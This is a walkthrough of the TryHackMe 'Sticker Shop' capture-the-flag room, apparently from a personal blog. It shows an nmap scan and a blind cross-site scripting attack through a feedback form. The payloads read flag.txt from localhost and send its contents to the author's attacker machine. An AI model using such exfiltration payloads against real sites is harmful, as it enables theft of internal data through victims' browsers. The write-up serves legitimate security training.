---
title: TryHackMe - The Sticker Shop
author: rene
description: A simple walkthrough on using ❌ Cross-Site Scripting for this challenge #
categories: [TryHackMe]
tags: [web, xss]     # TAG names should always be lowercase
render_with_liquid: false
image:
    path: /images/tryhackme_the_sticker_shop/room_image.png
---
Can you exploit the sticker shop in order to capture the flag?

[![Tryhackme Room Link](/images/tryhackme_the_sticker_shop/room_card.png){: width="300" height="300" .shadow}](https://tryhackme.com/room/thestickershop){: .center }

Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

Let’s start by scanning open ports:

```console
nmap -T4 -n -sC -sV -Pn -p- 10.10.10.243
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
|_  256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
8080/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.8.10)
|_http-title: Cat Sticker Shop
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As the backup http port is open we can visit the website via `10.10.10.243:8080`

Let’s try to visit `10.10.10.243:8080/flag.txt`
![Slash Flag.txt](/images/tryhackme_the_sticker_shop/slash-flagtxt.png){: width="600" height="450" .shadow}


Let's visit Feedback subpage
![Submit Page](/images/tryhackme_the_sticker_shop/form.png){: width="600" height="450" .shadow}

Let's try some XSS

Let's host a python server and try to fetch our attacker machine via script
```console
python3 -m http.server 8000
```

And Submit our script

```console
</textarea><script>fetch('http://10.11.75.122:8000');</script>
```

We've got a response meaning we have a Blind XSS vulnerability

![Submit Page](/images/tryhackme_the_sticker_shop/xss_to_myself.png){: width="600" height="450" .shadow}

Now we can try to craft a payload which will look like this
```console
</textarea><script>async function a() {const res1 = await fetch('http://127.0.0.1:8080/flag.txt');const b = await res1.text();const res2 = await fetch('http://10.11.75.122:8000?a=' + b);}a();</script>
```

##### Breakdown:

1. Fetches `flag.txt` from `http://127.0.0.1:8080/flag.txt`.
2. Reads its contents as text.
3. Sends the stolen content as a query parameter (`a=<OUR_FLAG>`) to `http://10.11.75.122:8000` (Our Attacker Machine).

Which will give us the flag

![Submit Page](/images/tryhackme_the_sticker_shop/flag.png){: width="600" height="450" .shadow}

---

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
</style>